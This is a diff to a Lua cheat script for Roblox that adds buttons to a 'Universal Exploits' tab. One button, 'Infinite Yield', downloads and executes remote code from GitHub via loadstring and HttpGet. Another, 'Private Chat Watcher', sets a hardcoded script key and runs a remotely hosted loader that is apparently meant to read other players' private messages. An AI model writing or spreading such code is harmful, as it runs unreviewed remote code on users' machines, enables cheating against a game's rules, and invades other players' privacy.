@@ -88,7 +88,7 @@ MainTab:CreateButton({
         local hrp = character and character:FindFirstChild("HumanoidRootPart")
         local humanoid = character and character:FindFirstChildOfClass("Humanoid")
         if character and hrp and humanoid then
-            -- Tilt head into floor (90 degrees forward)
+            -- Tilt head into floor
             hrp.CFrame = hrp.CFrame * CFrame.Angles(math.rad(90), 0, 0)
             -- Load animation
             local anim = Instance.new("Animation")
@@ -109,6 +109,7 @@ MainTab:CreateButton({
 -- Create Universal Exploits Tab
 local ExploitsTab = Window:CreateTab("Universal Exploits", 4483362458)
 
+-- Fake Lag
 ExploitsTab:CreateButton({
     Name = "Fake Lag",
     Callback = function()
@@ -190,6 +191,23 @@ ExploitsTab:CreateButton({
                 coroutine.resume(fakeLagThread)
             end
         end)
+    end,
+})
+
+-- Infinite Yield
+ExploitsTab:CreateButton({
+    Name = "Infinite Yield",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+    end,
+})
+
+-- Private Chat Watcher
+ExploitsTab:CreateButton({
+    Name = "Private Chat Watcher",
+    Callback = function()
+        script_key = "QdfQhCocrHCcpMsfKCfVrMapjhbeUMJO"
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/de25675e44d2b892b53180a0ac2e85f9.lua"))()
     end,
 })
 
